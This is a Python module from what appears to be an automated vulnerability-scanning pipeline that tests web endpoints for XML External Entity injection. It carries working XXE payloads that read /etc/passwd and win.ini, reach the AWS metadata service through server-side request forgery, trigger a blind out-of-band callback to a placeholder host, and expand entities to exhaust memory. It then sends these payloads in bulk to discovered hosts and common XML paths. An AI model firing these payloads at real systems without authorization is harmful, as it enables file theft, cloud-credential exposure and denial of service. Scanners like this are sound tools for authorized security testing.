import os
#!/usr/bin/env python3
# modules/step23_xxe.py — XXE (XML External Entity) Injection Testing
# MilkyWay Intelligence | Author: Sharlix

import re
from core.utils import safe_read
from core.http_client import sync_post, sync_get

XXE_PAYLOADS = [
    # Basic file read
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<root>&xxe;</root>',
     "root:x:0:0", "Local file read: /etc/passwd"),

    # Windows
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<root>&xxe;</root>',
     "[fonts]", "Local file read: win.ini (Windows)"),

    # SSRF via XXE
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
     '<root>&xxe;</root>',
     "ami-id", "SSRF via XXE — AWS metadata"),

    # OOB XXE
    ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://M7OOB_PLACEHOLDER/xxe">%xxe;]>'
     '<root>test</root>',
     None, "OOB XXE (blind)"),

    # Billion laughs (DoS — mild version)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
     '<root>&lol2;</root>',
     "lol", "Entity expansion (billion laughs DoS)"),
]

# XML content-type endpoints
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/atom+xml",
]

# Common XML-accepting paths
XML_PATHS = [
    "/api/xml","/api/upload","/api/import","/api/parse",
    "/upload","/import","/feed","/rss","/atom","/soap",
    "/api/v1/xml","/api/data","/webhook",
]



def _get_live_hosts(p, limit=100):
    """Returns live hosts - ALWAYS includes main target as fallback."""
    tgt = p.target.strip()
    if not tgt.startswith("http"):
        tgt = "https://" + tgt

    hosts = []
    seen  = set()

    for key in ("fmt_url", "live_hosts", "resolved"):
        src = p.files.get(key, "")
        if not src or not os.path.isfile(src):
            continue
        from core.utils import safe_read
        for line in safe_read(src):
            line = line.strip()
            if not line:
                continue
            if not line.startswith("http"):
                line = "https://" + line
            if line not in seen:
                seen.add(line)
                hosts.append(line)
        if hosts:
            break

    # GUARANTEED: always include main target
    if tgt not in seen:
        hosts.insert(0, tgt)

    return hosts[:limit]


class Step23Xxe:
    def __init__(self, pipeline):
        self.p = pipeline

    def run(self):
        p     = self.p
        out   = f"{p.out}/{p.prefix}_xxe.txt"
        live  = safe_read(p.files.get("fmt_url",""))[:100]
        urls  = safe_read(p.files.get("urls",""))
        found = 0

        if not live:
            p.log.warn("XXE: no live hosts"); return

        p.log.info("XXE injection testing")
        auth_h = {}
        if getattr(p.args,"cookie",None):
            auth_h["Cookie"] = p.args.cookie

        # OOB placeholder
        oob_url = None
        if hasattr(p,"oob") and p.oob:
            oob_url = p.oob.get_payload("xxe", p.target)

        for host in live:
            host = host.rstrip("/")

            # Find XML-accepting endpoints from discovered URLs
            xml_endpoints = [u for u in urls if any(p_ in u for p_ in XML_PATHS)
                             and host.split("//")[-1].split("/")[0] in u]
            xml_endpoints.extend([host + path for path in XML_PATHS[:6]])

            for endpoint in xml_endpoints[:50]:
                for payload, indicator, label in XXE_PAYLOADS:
                    if oob_url and "M7OOB_PLACEHOLDER" in payload:
                        payload = payload.replace("M7OOB_PLACEHOLDER", oob_url.replace("http://",""))

                    for ct in XML_CONTENT_TYPES[:2]:
                        headers = {**auth_h, "Content-Type": ct}
                        resp    = sync_post(endpoint, data=payload.encode(),
                                            headers=headers, timeout=10)
                        if not resp:
                            continue

                        body = resp.get("body","")
                        status = resp.get("status",0)

                        if status == 0:
                            continue

                        # Check for direct output
                        if indicator and re.search(re.escape(indicator), body, re.IGNORECASE):
                            detail = f"XXE confirmed ({label}): '{indicator}' in response"
                            with open(out,"a") as f:
                                f.write(f"XXE: {endpoint} | {detail}\n")
                            p.add_finding("critical","XXE",endpoint,detail,"xxe-engine")
                            found += 1
                            break

                        # Error-based: server processed XML entity
                        if (status in (500,400) and
                                re.search(r'(entity|xml|parse|dtd)',body,re.IGNORECASE)):
                            detail = f"Possible XXE ({label}): XML parsing error suggests entity processed"
                            p.add_finding("medium","XXE_POSSIBLE",endpoint,detail,"xxe-engine")

        # Check OOB callbacks
        if p.oob:
            triggered = p.oob.get_triggered()
            for token, cb in triggered.items():
                if cb.get("vuln_type") == "xxe":
                    p.add_finding("critical","XXE_OOB",cb.get("context_url",p.target),
                        f"Blind XXE confirmed via OOB callback from {token}","xxe-oob")
                    found += 1

        p.log.success(f"XXE: {found} findings")
